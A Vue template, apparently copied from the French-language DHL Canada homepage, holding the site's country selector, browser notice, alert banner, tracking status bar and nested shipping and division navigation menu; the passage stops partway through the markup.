<template>
  <div>
    <nav class="c-nav-wcag">
      <span class="sr-only">Navigation et contenu</span>
      <ul>
        <li>
          <a href="#wcag-main-content"
            >Ignorer et accéder au contenu principal</a
          >
        </li>
        <li>
          <a href="#wcag-footer"
            >Ignorer et accéder au pied de page principal</a
          >
        </li>
      </ul>
    </nav>

    <div
      class="c-country-selection-layer component-wide l-grid l-grid--left-s l-grid--center-m js--country-selection-layer"
      data-cookie="country"
      data-cookie-value="ca"
      data-cookie-validity="365"
      data-cookie-path="/"
    >
      <div
        class="c-country-selection-layer--container l-grid l-grid--w-100pc-s"
      >
        <div class="l-grid l-grid--w-100pc-s l-grid--left-m">
          <div class="l-grid l-grid--w-100pc-m-s">
            <div class="c-country-selection-layer--flag">
              <span class="flag-icon flag-icon-ca"></span>
            </div>
            <div
              class="c-country-selection-layer--copy-container l-grid l-grid--w-auto-s l-grid--middle-s l-grid--w-reset-m"
            >
              <span class="c-country-selection-layer--copy"
                >Vous êtes situé au</span
              >
              <span class="c-country-selection-layer--copy"
                ><strong>&nbsp;Canada</strong></span
              >
            </div>
          </div>

          <div
            class="l-grid l-grid--w-100pc-m-s l-grid--w-100pc-s-l l-grid--w-100pc-s-m l-grid--w-100pc-s l-grid--w-reset-m"
          >
            <div
              class="base-button js--country-selection-layer-close c--country-selection-layer-close js--cookie-set"
              tabindex="0"
              data-tracking='{"component":"dhl/components/global/country-selection-layer"}'
            >
              <span>Rester sur cette page</span>
            </div>
            <span
              class="c-country-selection-layer--base-copy l-grid l-grid--w-100pc-s l-grid--center-s l-grid--middle-s l-grid--w-reset-m l-grid--left-m"
              >ou</span
            >
            <a
              href="https://www.dhl.com/ca-fr/home/location-selector-redirect.html"
              class="base-button base-button--white"
              data-tracking='{"component":"dhl/components/global/country-selection-layer"}'
            >
              <span>Sélectionnez un autre endroit</span>
            </a>
          </div>
        </div>
      </div>
    </div>
    <div
      class="c-overlay-small yellow js--non-supported-browser c-non-supported-browser"
    >
      <div class="component-wide">
        <div class="c-overlay-small--box has-rte">
          <a
            href="#"
            class="c-product-close icon-cancel js--non-supported-browser-close"
            tabindex="0"
            title="Close"
            data-tracking='{"component":"dhl/components/global/non-supported-browser-overlay"}'
          ></a>
          <div class="c-overlay-small--inner">
            <div class="c-overlay-small--scrollcontainer">
              <h3>Bonjour utilisateur</h3>
              <p></p>
              <p class="has-rte">
                Vous visitez cette page avec un navigateur, qui peut procurer
                une expérience qui n’est pas optimale.
              </p>
              <p class="has-rte">
                Vous pouvez continuer, mais pour connaître la meilleur
                expérience sur cette page, nous recommandons Edge, Firefox et
                Chrome.
              </p>
              <ul class="list is-left has-no-padding">
                <li>
                  <span
                    ><a
                      href="https://www.google.co.uk/chrome/"
                      title="Télécharger Chrome"
                      target="_blank"
                      class="link link-external link-red has-icon"
                      rel="noopener noreferrer"
                      >Chrome</a
                    ></span
                  >
                </li>
                <li>
                  <span
                    ><a
                      title="Télécharger Microsoft Edge"
                      href="https://www.microsoft.com/en-us/edge"
                      target="_blank"
                      class="link link-external link-red has-icon"
                      rel="noopener noreferrer"
                      >Edge</a
                    ></span
                  >
                </li>
                <li>
                  <span
                    ><a
                      title="Télécharger Firefox"
                      href="https://www.mozilla.org/en-GB/firefox/new/"
                      target="_blank"
                      class="link link-external link-red has-icon"
                      rel="noopener noreferrer"
                      >Firefox</a
                    ></span
                  >
                </li>
              </ul>
              <div class="c-overlay-small--button-container">
                <a
                  href="#"
                  class="base-button js--non-supported-browser-close"
                  data-tracking='{"component":"dhl/components/global/non-supported-browser-overlay"}'
                >
                  <span>Continue avec IE</span>
                </a>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
    <div class="section"></div>
    <div class="iparys_inherited"></div>

    <div
      class="c-global-newsflash--wrapper js--global-newsflash"
      data-jsonurl="https://www.dhl.com/global/dhl/news-alerts.gnf.json"
    >
      <div
        class="c-global-newsflash component-wide l-grid l-grid--left-s l-grid--bottom-s l-grid--nowrap-m js-global-newsflash"
      >
        <div
          class="l-grid--w-90pc-s l-grid--w-90pc-m l-grid--left-m c-global-newsflash--content-wrapper"
        >
          <i class="c-global-newsflash-icon-alert icon-exception"></i>
          <a
            data-linkname="newsflash"
            class="c-global-newsflash--copy js--global-newsflash--link c-global-newsflash--copy--mobile js-global-newsflash--copy--mobile link-internal link no-nowrap l-grid--hidden-m l-grid--visible-s has-icon"
            target="_blank"
            rel="noopener noreferrer"
            title="Voir les alertes affectant le service de DHL "
            >Voir les alertes affectant le service de DHL
            <span class="sr-only"
              >Voir les alertes affectant le service de DHL
            </span>
          </a>
          <span
            class="c-global-newsflash-close link-icon icon-cancel js--global-newsflash-close"
            title="Close"
          >
            <span class="sr-only">Close</span>
          </span>
        </div>
      </div>
    </div>

    <!--googleon: all-->

    <div class="l-view">
      <div
        class="c-tracking-results--status-bar-container l-grid"
        style="margin-left: 15px; margin-bottom: 15px"
      >
        <div
          class="c-tracking-results-status-bar l-grid--w-33pc-s bar-2 bar-success"
        ></div>
        <div
          class="c-tracking-results-status-bar l-grid--w-33pc-s bar-2 bar-success"
        ></div>
        <div
          class="c-tracking-results-status-bar l-grid--w-33pc-s bar-2 bar-success"
        ></div>
      </div>
      <header>
        <div class="headeriparsys iparsys parsys">
          <!--googleoff: all-->

          <div class="c-nav--layer js--nav-layer"></div>
          <div id="navigation-primary" class="l-header c-voc-nav js--voc-nav">
            <nav class="c-nav l-grid">
              <span class="sr-only">Navigation principale</span>
              <div
                class="c-nav-primary--meta-container l-grid l-grid--w-100pc-m"
              >
                <div>
                  <a
                    href="https://www.dhl.com/ca-fr/home.html"
                    class="c-nav--logo"
                  >
                    <img
                      src="https://www.dhl.com/content/dam/dhl/global/core/images/logos/dhl-logo.svg"
                      alt="Retour à l’accueil"
                    />
                  </a>
                </div>
                <div
                  class="c-nav-primary--meta l-grid--hidden-s l-grid--visible-m"
                >
                  <div
                    class="l-grid l-grid--row-reverse l-grid--w-100pc-s c-nav-primary--meta-links-container"
                  >
                    <ul
                      class="c-nav-primary--meta-main js-nav-primary--meta-links"
                    >
                      <li class="l-grid js--nav-tohide">
                        <a
                          class="has-icon icon-globe"
                          href="https://www.dhl.com/ca-fr/home/selecteur-de-lieu.html"
                          title="Sélectionnez l&#39;emplacement"
                          >Canada</a
                        >
                      </li>
                      <li class="l-grid c-nav--language js--nav-tohide">
                        <a
                          class="js--cookie-set js--nav-lang"
                          data-cookie="lang"
                          data-cookie-value="en"
                          data-cookie-validity="365"
                          data-cookie-path="/"
                          title="English"
                          href="https://www.dhl.com/ca-en/home.html"
                          >EN</a
                        >

                        <span class="is-selected js--nav-lang" title="Français"
                          >FR</span
                        >
                      </li>

                      <!--Start of Form-->

                      <li
                        class="l-grid c--nav-primary--searchcontainer js--nav-primary--searchcontainer"
                      >
                        <form
                          class="c-nav-primary--searchform js--nav-primary--searchform"
                        >
                          <input
                            class="c-nav-primary--searchbar js--nav-primary--searchbar"
                            id="searchbar"
                            autocomplete="off"
                            max-num-list="5"
                            type="text"
                            placeholder="Rechercher dans dhl.com"
                            name="q"
                          />
                          <label
                            for="searchbar"
                            class="c-nav-primary--searchbar-label has-icon icon-search"
                            >Rechercher</label
                          >
                          <div
                            class="c-nav-primary--searchbar-quicklinks js--nav-primary--searchbar-quicklinks"
                          >
                            <ul class="shadow-small"></ul>
                          </div>
                        </form>
                      </li>

                      <!--End of Form-->
                    </ul>
                    <ul
                      class="c-nav-primary--meta-others js-nav-primary--meta-links"
                    >
                      <li
                        class="l-grid js--nav-tohide c-nav-primary--globalnewsflash js--nav-primary--globalnewsflash not-visible"
                      >
                        <a
                          class="has-icon icon-exception"
                          href="https://www.dhl.com/global-en/home/global-news-alerts.html"
                          target="_blank"
                          title="Alertes"
                          rel="noopener noreferrer"
                        >
                          Alertes
                          <span class="sr-only">Alertes</span>
                        </a>
                      </li>
                    </ul>
                  </div>
                </div>
              </div>
              <ul
                class="c-nav--mobile js--nav-mobile l-grid--right-s l-grid--w-80pc-m l-grid--visible-s l-grid--hidden-m"
              >
                <li
                  class="c-nav--button type--country js--mobile-toggle has-subnav js--has-subnav"
                >
                  <a
                    class="has-icon icon-globe"
                    href="https://www.dhl.com/ca-fr/home/selecteur-de-lieu.html"
                  >
                    <span class="sr-only">Sélectionnez l&#39;emplacement</span>
                  </a>
                  <div class="l-grid c-nav--menu-container l-grid--w-100pc-s">
                    <ul
                      class="l-grid l-grid--w-100pc-s l-grid--left-s"
                      data-level="0"
                    >
                      <li class="l-grid l-grid--w-100pc-s">
                        <a
                          class="link has-icon"
                          href="https://www.dhl.com/ca-fr/home/selecteur-de-lieu.html"
                        >
                          <div class="l-grid">
                            <div class="c-nav--mobile--flag">
                              <span class="flag-icon flag-icon-ca"></span>
                            </div>
                            <div class="l-grid l-grid--w-auto-s">
                              <span class="l-grid--w-100pc-s">Canada</span>
                              <span
                                class="c-nav--mobile--country-helptext l-grid--w-100pc-s"
                                >Sélectionnez l&#39;emplacement</span
                              >
                            </div>
                          </div>
                        </a>
                      </li>
                      <li class="l-grid--w-100pc-s l-grid--hidden-m">
                        <div
                          class="l-grid c-nav--country-selector-language l-grid--visible-s l-grid--hidden-m"
                        >
                          <a
                            class="l-grid--w-reset-s c-nav--country-selector-language-option js--cookie-set"
                            data-cookie="lang"
                            data-cookie-value="en"
                            data-cookie-validity="365"
                            data-cookie-path="/"
                            href="https://www.dhl.com/ca-en/home.html"
                            >EN</a
                          >

                          <span
                            class="l-grid--w-reset-s c-nav--country-selector-language-option is-selected"
                            >FR</span
                          >
                        </div>
                      </li>
                    </ul>
                  </div>
                </li>
                <li>
                  <a
                    class="has-icon icon-search"
                    href="https://www.dhl.com/ca-fr/home/rechercher.html"
                  >
                    <span class="sr-only">Rechercher</span>
                  </a>
                </li>
                <li
                  class="c-nav--button type--menu js--mobile-toggle js--nav-mobile-item l-grid l-grid--left-s has-subnav js--has-subnav"
                >
                  <div class="c-nav--menu-icon">
                    <span></span>
                    <span></span>
                    <span></span>
                    <span></span>
                  </div>
                  <span class="sr-only">Menu</span>
                  <div class="l-grid c-nav--menu-container l-grid--w-100pc-s">
                    <ul class="l-grid l-grid--w-100pc-s" data-level="0">
                      <li
                        class="c-nav--headline l-grid--w-100pc-s l-grid--hidden-m"
                      >
                        DHL Canada
                      </li>

                      <li
                        class="l-grid--w-100pc-s js--nav-mobile-item"
                        data-level="1"
                      >
                        <a
                          class="link has-icon"
                          href="https://www.dhl.com/ca-fr/home/suivi.html"
                          data-tracking='{"component":"dhl/components/navigation/primary","name":"DHL Tracking"}'
                          >Track</a
                        >
                      </li>

                      <li
                        class="l-grid--w-100pc-s js--nav-mobile-item has-subnav js--has-subnav"
                        data-level="2"
                      >
                        <a
                          class="link has-icon"
                          href="https://www.dhl.com/ca-fr/home/envoyer.html"
                          data-tracking='{"component":"dhl/components/navigation/primary","name":"Ship"}'
                          >Ship</a
                        >
                        <ul class="l-grid l-grid--w-100pc-s">
                          <li
                            class="c-nav--back-button js--nav-back l-grid--w-100pc-s l-grid--hidden-m"
                          >
                            <a class="link has-icon icon-chevron-back" href="#"
                              >Retour</a
                            >
                          </li>
                          <li
                            class="c-nav--headline l-grid--w-100pc-s l-grid--hidden-m"
                          >
                            <a
                              class="link has-icon"
                              href="https://www.dhl.com/ca-fr/home/envoyer.html"
                              >Ship</a
                            >
                          </li>

                          <li
                            class="l-grid--w-100pc-s js--nav-mobile-item"
                            data-level="2&#45;1"
                          >
                            <a
                              class="link has-icon"
                              href="https://www.dhl.com/ca-fr/home/envoyer/ship-now-mobile.html"
                              data-tracking='{"component":"dhl/components/navigation/primary","name":"Ship Now"}'
                              >Ship now</a
                            >
                          </li>

                          <li
                            class="l-grid--w-100pc-s js--nav-mobile-item"
                            data-level="2&#45;2"
                          >
                            <a
                              class="link has-icon"
                              href="https://www.dhl.com/ca-fr/home/envoyer/get-a-quote-mobile.html"
                              data-tracking='{"component":"dhl/components/navigation/primary","name":"Get a Quote"}'
                              >Get a quote</a
                            >
                          </li>

                          <li
                            class="l-grid--w-100pc-s js--nav-mobile-item"
                            data-level="2&#45;3"
                          >
                            <a
                              class="link has-icon"
                              href="https://www.dhl.com/ca-fr/home/envoyer/dhl-for-business-mobile.html"
                              data-tracking='{"component":"dhl/components/navigation/primary","name":"DHL for Business"}'
                              >DHL pour le Business</a
                            >
                          </li>

                          <li
                            class="l-grid--w-100pc-s js--nav-mobile-item"
                            data-level="2&#45;4"
                          >
                            <a
                              class="link has-icon"
                              href="https://www.dhl.com/ca-fr/home/envoyer/expedition-de-colis-et-de-documents.html"
                              data-tracking='{"component":"dhl/components/navigation/primary","name":"Parcel &amp; Document Shipping"}'
                              >Expédition de documents et de colis</a
                            >
                          </li>

                          <li
                            class="l-grid--w-100pc-s js--nav-mobile-item"
                            data-level="2&#45;5"
                          >
                            <a
                              class="link has-icon"
                              href="https://www.dhl.com/ca-fr/home/envoyer/expedition-de-fret.html"
                              data-tracking='{"component":"dhl/components/navigation/primary","name":"Freight Shipping"}'
                              >Expédition de fret</a
                            >
                          </li>
                        </ul>
                      </li>

                      <li
                        class="l-grid--w-100pc-s js--nav-mobile-item"
                        data-level="3"
                      >
                        <a
                          class="link has-icon"
                          href="https://www.dhl.com/ca-fr/home/solutions-logistiques.html"
                          data-tracking='{"component":"dhl/components/navigation/primary","name":"Logistics Solutions"}'
                          >Logistics solutions</a
                        >
                      </li>

                      <li
                        class="l-grid--w-100pc-s js--nav-mobile-item"
                        data-level="4"
                      >
                        <a
                          class="link has-icon"
                          href="https://www.dhl.com/ca-fr/home/customer-service.html"
                          data-tracking='{"component":"dhl/components/navigation/primary","name":"Customer Service"}'
                          >Customer service</a
                        >
                      </li>

                      <li
                        class="l-grid--w-100pc-s js--nav-mobile-item has-subnav js--has-subnav"
                        data-level="5"
                      >
                        <a
                          class="link has-icon"
                          href="https://www.dhl.com/ca-fr/home/nos-divisions.html"
                          data-tracking='{"component":"dhl/components/navigation/primary","name":"Our Divisions"}'
                          >Nos divisions</a
                        >
                        <ul class="l-grid l-grid--w-100pc-s">
                          <li
                            class="c-nav--back-button js--nav-back l-grid--w-100pc-s l-grid--hidden-m"
                          >
                            <a class="link has-icon icon-chevron-back" href="#"
                              >Retour</a
                            >
                          </li>
                          <li
                            class="c-nav--headline l-grid--w-100pc-s l-grid--hidden-m"
                          >
                            <a
                              class="link has-icon"
                              href="https://www.dhl.com/ca-fr/home/nos-divisions.html"
                              >Nos divisions</a
                            >
                          </li>

                          <li
                            class="l-grid--w-100pc-s js--nav-mobile-item"
                            data-level="5&#45;1"
                          >
                            <a
                              class="link has-icon"
                              href="https://www.dhl.com/ca-fr/home/nos-divisions/express.html"
                              data-tracking='{"component":"dhl/components/navigation/primary","name":"DHL Express"}'
                              >DHL Express</a
                            >
                          </li>

                          <li
                            class="l-grid--w-100pc-s js--nav-mobile-item has-subnav js--has-subnav"
                            data-level="5&#45;2"
                          >
                            <a
                              class="link has-icon"
                              href="https://www.dhl.com/ca-fr/home/nos-divisions/commerce-electronique.html"
                              data-tracking='{"component":"dhl/components/navigation/primary","name":"DHL eCommerce"}'
                              >DHL eCommerce Solutions</a
                            >
                            <ul class="l-grid l-grid--w-100pc-s">
                              <li
                                class="c-nav--back-button js--nav-back l-grid--w-100pc-s l-grid--hidden-m"
                              >
                                <a
                                  class="link has-icon icon-chevron-back"
                                  href="#"
                                  >Retour</a
                                >
                              </li>
                              <li
                                class="c-nav--headline l-grid--w-100pc-s l-grid--hidden-m"
                              >
                                <a
                                  class="link has-icon"
                                  href="https://www.dhl.com/ca-fr/home/nos-divisions/commerce-electronique.html"
                                  >DHL eCommerce Solutions</a
                                >
                              </li>

                              <li
                                class="l-grid--w-100pc-s js--nav-mobile-item has-subnav js--has-subnav"
                                data-level="5&#45;2&#45;1"
                              >
                                <a
                                  class="link has-icon"
                                  href="https://www.dhl.com/ca-fr/home/nos-divisions/commerce-electronique/expedition.html"
                                  data-tracking='{"component":"dhl/components/navigation/primary","name":"Shipping"}'
                                  >Expédition</a
                                >
                                <ul class="l-grid l-grid--w-100pc-s">
                                  <li
                                    class="c-nav--back-button js--nav-back l-grid--w-100pc-s l-grid--hidden-m"
                                  >
                                    <a
                                      class="link has-icon icon-chevron-back"
                                      href="#"
                                      >Retour</a
                                    >
                                  </li>
                                  <li
                                    class="c-nav--headline l-grid--w-100pc-s l-grid--hidden-m"
                                  >
                                    <a
                                      class="link has-icon"
                                      href="https://www.dhl.com/ca-fr/home/nos-divisions/commerce-electronique/expedition.html"
                                      >Expédition</a
                                    >
                                  </li>

                                  <li
                                    class="l-grid--w-100pc-s js--nav-mobile-item"
                                    data-level="5&#45;2&#45;1&#45;1"
                                  >
                                    <a
                                      class="link has-icon"
                                      href="https://www.dhl.com/ca-fr/home/nos-divisions/commerce-electronique/expedition/livraison-internationale.html"
                                      data-tracking='{"component":"dhl/components/navigation/primary","name":"International Shipping"}'
                                      >Expédition internationale</a
                                    >
                                  </li>

                                  <li
                                    class="l-grid--w-100pc-s js--nav-mobile-item"
                                    data-level="5&#45;2&#45;1&#45;2"
                                  >
                                    <a
                                      class="link has-icon"
                                      href="https://www.dhl.com/ca-fr/home/nos-divisions/commerce-electronique/expedition/informations-pratiques.html"
                                      data-tracking='{"component":"dhl/components/navigation/primary","name":"Additional Information &amp; Services"}'
                                      >Informations supplémentaires et
                                      services</a
                                    >
                                  </li>

                                  <li
                                    class="l-grid--w-100pc-s js--nav-mobile-item"
                                    data-level="5&#45;2&#45;1&#45;3"
                                  >
                                    <a
                                      class="link has-icon"
                                      href="https://www.dhl.com/ca-fr/home/nos-divisions/commerce-electronique/expedition/portail-ameriques.html"
                                      data-tracking='{"component":"dhl/components/navigation/primary","name":"Portal Americas"}'
                                      >Portail Web client</a
                                    >
                                  </li>
                                </ul>
                              </li>

                              <li
                                class="l-grid--w-100pc-s js--nav-mobile-item"
                                data-level="5&#45;2&#45;2"
                              >
                                <a
                                  class="link has-icon"
                                  href="https://www.dhl.com/ca-fr/home/nos-divisions/commerce-electronique/suivi-commerce-electronique.html"
                                  data-tracking='{"component":"dhl/components/navigation/primary","name":"Tracking"}'
                                  >Track</a
                                >
                              </li>

                              <li
                                class="l-grid--w-100pc-s js--nav-mobile-item has-subnav js--has-subnav"
                                data-level="5&#45;2&#45;3"
                              >
                                <a
                                  class="link has-icon"
                                  href="https://www.dhl.com/ca-fr/home/nos-divisions/commerce-electronique/service-client.html"
                                  data-tracking='{"component":"dhl/components/navigation/primary","name":"Customer Service"}'
                                  >Service à la clientèle</a
                                >
                                <ul class="l-grid l-grid--w-100pc-s">
                                  <li
                                    class="c-nav--back-button js--nav-back l-grid--w-100pc-s l-grid--hidden-m"
                                  >
                                    <a
                                      class="link has-icon icon-chevron-back"
                                      href="#"
                                      >Retour</a
                                    >
                                  </li>
                                  <li
                                    class="c-nav--headline l-grid--w-100pc-s l-grid--hidden-m"
                                  >
                                    <a
                                      class="link has-icon"
                                      href="https://www.dhl.com/ca-fr/home/nos-divisions/commerce-electronique/service-client.html"
                                      >Service à la clientèle</a
                                    >
                                  </li>

                                  <li
                                    class="l-grid--w-100pc-s js--nav-mobile-item"
                                    data-level="5&#45;2&#45;3&#45;1"
                                  >
                                    <a
                                      class="link has-icon"
                                      href="https://www.dhl.com/ca-fr/home/nos-divisions/commerce-electronique/service-client/contact-commerce-electronique-client-international.html"
                                      data-tracking='{"component":"dhl/components/navigation/primary","name":"Contact eCommerce Consumer International"}'
                                      >Contactez-nous - Particulier</a
                                    >
                                  </li>

                                  <li
                                    class="l-grid--w-100pc-s js--nav-mobile-item"
                                    data-level="5&#45;2&#45;3&#45;2"
                                  >
                                    <a
                                      class="link has-icon"
                                      href="https://www.dhl.com/ca-fr/home/nos-divisions/commerce-electronique/service-client/contact-commerce-electronique-nous-contacter.html"
                                      data-tracking='{"component":"dhl/components/navigation/primary","name":"Contact eCommerce Business"}'
                                      >Contactez-nous - Entreprise</a
                                    >
                                  </li>

                                  <li
                                    class="l-grid--w-100pc-s js--nav-mobile-item"
                                    data-level="5&#45;2&#45;3&#45;3"
                                  >
                                    <a
                                      class="link has-icon"
                                      href="https://www.dhl.com/ca-fr/home/nos-divisions/commerce-electronique/service-client/contact-commerce-electronique-affaires-cotation.html"
                                      data-tracking='{"component":"dhl/components/navigation/primary","name":"Contact eCommerce Business Get a Quote"}'
                                      >Obtenez un prix</a
                                    >
                                  </li>
                                </ul>
                              </li>

                              <li
                                class="l-grid--w-100pc-s js--nav-mobile-item"
                                data-level="5&#45;2&#45;4"
                              >
                                <a
                                  class="link has-icon"
                                  href="https://www.dhl.com/ca-fr/home/nos-divisions/commerce-electronique/a-propos-commerce-electronique.html"
                                  data-tracking='{"component":"dhl/components/navigation/primary","name":"About DHL eCommerce"}'
                                  >À propos de DHL eCommerce Solutions</a
                                >
                              </li>
                            </ul>
                          </li>

                          <li
                            class="l-grid--w-100pc-s js--nav-mobile-item has-subnav js--has-subnav"
                            data-level="5&#45;3"
                          >
                            <a
                              class="link has-icon"
                              href="https://www.dhl.com/ca-fr/home/nos-divisions/expediteur-mondial.html"
                              data-tracking='{"component":"dhl/components/navigation/primary","name":"DHL Global Forwarding"}'
                              >DHL Global Forwarding</a
                            >
                            <ul class="l-grid l-grid--w-100pc-s">
                              <li
                                class="c-nav--back-button js--nav-back l-grid--w-100pc-s l-grid--hidden-m"
                              >
                                <a
                                  class="link has-icon icon-chevron-back"
                                  href="#"
                                  >Retour</a
                                >
                              </li>
                              <li
                                class="c-nav--headline l-grid--w-100pc-s l-grid--hidden-m"
                              >
                                <a
                                  class="link has-icon"
                                  href="https://www.dhl.com/ca-fr/home/nos-divisions/expediteur-mondial.html"
                                  >DHL Global Forwarding</a
                                >
                              </li>

                              <li
                                class="l-grid--w-100pc-s js--nav-mobile-item"
                                data-level="5&#45;3&#45;1"
                              >
                                <a
                                  class="link has-icon"
                                  href="https://www.dhl.com/ca-fr/home/nos-divisions/expediteur-mondial/fret-aerien.html"
                                  data-tracking='{"component":"dhl/components/navigation/primary","name":"Air Freight"}'
                                  >Fret aérien</a
                                >
                              </li>

                              <li
                                class="l-grid--w-100pc-s js--nav-mobile-item has-subnav js--has-subnav"
                                data-level="5&#45;3&#45;2"
                              >
                                <a
                                  class="link has-icon"
                                  href="https://www.dhl.com/ca-fr/home/nos-divisions/expediteur-mondial/fret-maritime.html"
                                  data-tracking='{"component":"dhl/components/navigation/primary","name":"Ocean Freight"}'
                                  >Fret maritime</a
                                >
                                <ul class="l-grid l-grid--w-100pc-s">
                                  <li
                                    class="c-nav--back-button js--nav-back l-grid--w-100pc-s l-grid--hidden-m"
                                  >
                                    <a
                                      class="link has-icon icon-chevron-back"
                                      href="#"
                                      >Retour</a
                                    >
                                  </li>
                                  <li
                                    class="c-nav--headline l-grid--w-100pc-s l-grid--hidden-m"
                                  >
                                    <a
                                      class="link has-icon"
                                      href="https://www.dhl.com/ca-fr/home/nos-divisions/expediteur-mondial/fret-maritime.html"
                                      >Fret maritime</a
                                    >
                                  </li>

                                  <li
                                    class="l-grid--w-100pc-s js--nav-mobile-item"
                                    data-level="5&#45;3&#45;2&#45;1"
                                  >
                                    <a
                                      class="link has-icon"
                                      href="https://www.dhl.com/ca-fr/home/nos-divisions/expediteur-mondial/fret-maritime/fcl-conteneur-complet.html"
                                      data-tracking='{"component":"dhl/components/navigation/primary","name":"Full-Container-Load (FCL)"}'
                                      >Conteneur complet (FCL)</a
                                    >
                                  </li>

                                  <li
                                    class="l-grid--w-100pc-s js--nav-mobile-item"
                                    data-level="5&#45;3&#45;2&#45;2"
                                  >
                                    <a
                                      class="link has-icon"
                                      href="https://www.dhl.com/ca-fr/home/nos-divisions/expediteur-mondial/fret-maritime/groupage-lcl.html"
                                      data-tracking='{"component":"dhl/components/navigation/primary","name":"Less-than-Container-Load (LCL)"}'
                                      >Service de conteneur de groupage (LCL)</a
                                    >
                                  </li>

                                  <li
                                    class="l-grid--w-100pc-s js--nav-mobile-item"
                                    data-level="5&#45;3&#45;2&#45;3"
                                  >
                                    <a
                                      class="link has-icon"
                                      href="https://www.dhl.com/ca-fr/home/nos-divisions/expediteur-mondial/fret-maritime/buyers-consolidation.html"
                                      data-tracking='{"component":"dhl/components/navigation/primary","name":"Buyers Consolidation"}'
                                      >Buyers Consolidation</a
                                    >
                                  </li>

                                  <li
                                    class="l-grid--w-100pc-s js--nav-mobile-item"
                                    data-level="5&#45;3&#45;2&#45;4"
                                  >
                                    <a
                                      class="link has-icon"
                                      href="https://www.dhl.com/ca-fr/home/nos-divisions/expediteur-mondial/fret-maritime/temperature-controlled-loads.html"
                                      data-tracking='{"component":"dhl/components/navigation/primary","name":"Temperature Controlled Loads"}'
                                      >Température contrôlée</a
                                    >
                                  </li>

                                  <li
                                    class="l-grid--w-100pc-s js--nav-mobile-item"
                                    data-level="5&#45;3&#45;2&#45;5"
                                  >
                                    <a
                                      class="link has-icon"
                                      href="https://www.dhl.com/ca-fr/home/nos-divisions/expediteur-mondial/fret-maritime/liquid-transportation-flexitanks.html"
                                      data-tracking='{"component":"dhl/components/navigation/primary","name":"Liquid Transportation &amp; Flexitanks"}'
                                      >Transport des Produits Liquides et
                                      Flexitank</a
                                    >
                                  </li>

                                  <li
                                    class="l-grid--w-100pc-s js--nav-mobile-item"
                                    data-level="5&#45;3&#45;2&#45;6"
                                  >
                                    <a
                                      class="link has-icon"
                                      href="https://www.dhl.com/ca-fr/home/nos-divisions/expediteur-mondial/fret-maritime/break-bulk-non-containerized.html"
                                      data-tracking='{"component":"dhl/components/navigation/primary","name":"Break Bulk &amp; Non-Containerized"}'
                                      >Breakbulk, marchandises en vrac (non
                                      conteneurisées)</a
                                    >
                                  </li>
                                </ul>
                              </li>

                              <li
                                class="l-grid--w-100pc-s js--nav-mobile-item"
                                data-level="5&#45;3&#45;3"
                              >
                                <a
                                  class="link has-icon"
                                  href="https://www.dhl.com/ca-fr/home/nos-divisions/expediteur-mondial/fret-routier.html"
                                  data-tracking='{"component":"dhl/components/navigation/primary","name":"Road Freight"}'
                                  >Fret routier</a
                                >
                              </li>

                              <li
                                class="l-grid--w-100pc-s js--nav-mobile-item"
                                data-level="5&#45;3&#45;4"
                              >
                                <a
                                  class="link has-icon"
                                  href="https://www.dhl.com/ca-fr/home/nos-divisions/expediteur-mondial/fret-ferroviaire.html"
                                  data-tracking='{"component":"dhl/components/navigation/primary","name":"Rail Freight"}'
                                  >Fret ferroviaire</a
                                >
                              </li>

                              <li
                                class="l-grid--w-100pc-s js--nav-mobile-item"
                                data-level="5&#45;3&#45;5"
                              >
                                <a
                                  class="link has-icon"
                                  href="https://www.dhl.com/ca-fr/home/nos-divisions/expediteur-mondial/douane.html"
                                  data-tracking='{"component":"dhl/components/navigation/primary","name":"Customs"}'
                                  >Douanes</a
                                >
                              </li>

                              <li
                                class="l-grid--w-100pc-s js--nav-mobile-item"
                                data-level="5&#45;3&#45;6"
                              >
                                <a
                                  class="link has-icon"
                                  href="https://www.dhl.com/ca-fr/home/nos-divisions/expediteur-mondial/jour-meme.html"
                                  data-tracking='{"component":"dhl/components/navigation/primary","name":"Same Day"}'
                                  >Le jour même</a
                                >
                              </li>

                              <li
                                class="l-grid--w-100pc-s js--nav-mobile-item has-subnav js--has-subnav"
                                data-level="5&#45;3&#45;7"
                              >
                                <a
                                  class="link has-icon"
                                  href="https://www.dhl.com/ca-fr/home/nos-divisions/expediteur-mondial/solutions.html"
                                  data-tracking='{"component":"dhl/components/navigation/primary","name":"Solutions"}'
                                  >Solutions</a
                                >
                                <ul class="l-grid l-grid--w-100pc-s">
                                  <li
                                    class="c-nav--back-button js--nav-back l-grid--w-100pc-s l-grid--hidden-m"
                                  >
                                    <a
                                      class="link has-icon icon-chevron-back"
                                      href="#"
                                      >Retour</a
                                    >
                                  </li>
                                  <li
                                    class="c-nav--headline l-grid--w-100pc-s l-grid--hidden-m"
                                  >
                                    <a
                                      class="link has-icon"
                                      href="https://www.dhl.com/ca-fr/home/nos-divisions/expediteur-mondial/solutions.html"
                                      >Solutions</a
                                    >
                                  </li>

                                  <li
                                    class="l-grid--w-100pc-s js--nav-mobile-item"
                                    data-level="5&#45;3&#45;7&#45;1"
                                  >
                                    <a
                                      class="link has-icon"
                                      href="https://www.dhl.com/ca-fr/home/nos-divisions/expediteur-mondial/solutions/solutions-de-transport.html"
                                      data-tracking='{"component":"dhl/components/navigation/primary","name":"Transport Solutions"}'
                                      >Solutions de transport</a
                                    >
                                  </li>

                                  <li
                                    class="l-grid--w-100pc-s js--nav-mobile-item"
                                    data-level="5&#45;3&#45;7&#45;2"
                                  >
                                    <a
                                      class="link has-icon"
                                      href="https://www.dhl.com/ca-fr/home/nos-divisions/expediteur-mondial/solutions/solutions-entreposage.html"
                                      data-tracking='{"component":"dhl/components/navigation/primary","name":"Warehousing Solutions"}'
                                      >Solutions d&#39;entreposage</a
                                    >
                                  </li>

                                  <li
                                    class="l-grid--w-100pc-s js--nav-mobile-item"
                                    data-level="5&#45;3&#45;7&#45;3"
                                  >
                                    <a
                                      class="link has-icon"
                                      href="https://www.dhl.com/ca-fr/home/nos-divisions/expediteur-mondial/solutions/solutions-de-gestion.html"
                                      data-tracking='{"component":"dhl/components/navigation/primary","name":"Management Services"}'
                                      >Solutions de gestion</a
                                    >
                                  </li>

                                  <li
                                    class="l-grid--w-100pc-s js--nav-mobile-item"
                                    data-level="5&#45;3&#45;7&#45;4"
                                  >
                                    <a
                                      class="link has-icon"
                                      href="https://www.dhl.com/ca-fr/home/nos-divisions/expediteur-mondial/solutions/solutions-integrees.html"
                                      data-tracking='{"component":"dhl/components/navigation/primary","name":"Integrated Solutions"}'
                                      >Solutions intégrées</a
                                    >
                                  </li>
                                </ul>
